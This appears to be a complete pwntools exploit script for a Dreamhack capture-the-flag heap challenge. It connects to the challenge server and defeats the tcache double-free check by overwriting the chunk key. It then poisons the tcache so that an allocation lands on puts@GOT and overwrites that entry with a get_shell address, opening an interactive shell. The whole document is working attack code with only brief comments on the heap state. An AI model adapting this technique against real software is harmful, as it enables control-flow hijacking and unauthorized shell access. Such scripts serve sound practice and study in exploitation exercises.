from pwn import *

get_shell = 0x401530
puts_got = 0x404020


def create_heap(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", size)
    p.sendlineafter(b"Data: ", data)


def delete_heap(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", idx)


def modify_heap(idx, size, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", idx)
    p.sendlineafter(b"Size: ", size)
    p.sendlineafter(b"Data: ", data)


p = remote("host3.dreamhack.games", 13316)

create_heap(b"30", b"TARGET")
create_heap(b"30", b"DUMMY")
delete_heap(b"1")
delete_heap(b"0")
# tcachebins -> TARGET -> DUMMY <- NULL
# count = 2

modify_heap(b"0", b"16", b"\x00" * 8 + b"KEY")
delete_heap(b"0")
# tcachebins -> TARGET <- TARGET
# count = 3

create_heap(b"30", p64(puts_got))
# tcachebins -> TARGET -> puts_got
# count = 2


create_heap(b"30", "AAAA")
# tcachebins -> puts_got
# count = 1

create_heap(b"30", p64(get_shell))

p.interactive()

